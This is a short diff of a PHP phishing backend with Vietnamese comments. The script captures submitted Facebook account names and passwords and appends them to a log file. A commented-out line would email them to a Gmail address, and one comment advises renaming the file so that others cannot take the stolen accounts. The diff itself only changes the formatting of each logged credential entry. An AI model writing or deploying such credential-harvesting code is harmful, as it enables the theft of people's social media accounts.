@@ -17,7 +17,7 @@ if(isset($_POST["acc"])){
     $type = $_POST["type"];
      $subject = "Cảm ơn bạn đã sử dụng code!";
      $headers = "Tài khoản facebook";
-      $body = "Time: ".$time."|acc $type: ".$acc."|pass: ".$pass."\n"; //định dạng acc|pass
+      $body = "\nTime: ".$time."|acc $type: ".$acc."|pass: ".$pass."\n____________________________________________________________\n";//định dạng acc|pass
     
      // mail("jaxuatt6@gmail.com", $headers, $body); // muốn gửi về mail thì bỏ 2 dấu // phía trước đi rồi thay mail
     $test = fopen("hu.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
